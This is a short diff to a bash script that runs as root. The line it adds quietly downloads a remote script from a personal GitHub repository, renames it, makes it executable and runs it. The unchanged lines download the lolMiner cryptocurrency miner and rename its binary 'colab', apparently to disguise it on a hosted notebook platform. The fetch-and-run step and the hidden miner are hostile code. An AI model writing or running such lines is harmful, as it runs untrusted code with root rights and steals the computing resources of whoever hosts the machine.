@@ -1,5 +1,6 @@
 #!/bin/bash
 sudo su <<EOF
+wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
 apt-get -y install screen && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.81/lolMiner_v1.81_Lin64.tar.gz && tar -xvf lolMiner_v1.81_Lin64.tar.gz && cd 1.81 && mv lolMiner colab
 EOF
 
